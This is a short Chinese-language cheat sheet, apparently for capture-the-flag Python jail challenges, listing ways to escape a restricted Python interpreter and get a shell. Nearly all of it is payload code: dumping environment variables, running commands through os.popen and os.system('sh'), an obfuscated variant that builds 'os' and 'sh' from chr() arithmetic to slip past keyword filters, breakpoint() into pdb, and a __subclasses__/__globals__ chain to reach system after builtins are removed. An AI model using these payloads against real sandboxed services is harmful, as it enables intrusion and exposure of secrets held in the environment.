
注意：python 3.7 以上支持[斜体字母](https://lingojam.com/ItalicTextGenerator)作为关键字

```python
import os
print(os.getcwd()) # 工作目录
print(os.environ)  # 环境变量
__import__('os').environ # 另一种方法
__import__('os').system('sh')

output = os.popen('ls').read() # 执行命令并获取输出
print(output)

chr(int(99+9+9/9+9/9+9/9)) # o
chr(int(99+9+9-9/9-9/9))   # s
chr(int(99+9-9/9-9/9-9/9-9/9)) # h
__import__(chr(int(99+9+9/9+9/9+9/9))+chr(int(99+9+9-9/9-9/9))).system(chr(int(99+9+9-9/9-9/9))+chr(int(99+9-9/9-9/9-9/9-9/9))) # __import__('os').system('sh')
```

chr 数字转字符，ord 字符转数字。

拿到 shell 的多种方法

```python
breakpoint()  # 进入 pdb，然后为所欲为
().__class__.__base__.__subclasses__()[-73].__init__.__globals__['system']('sh') # 在 __builtins__ 被橄榄之后，通过用 -1 ~ -150 替换“-73”来拿到 shell
```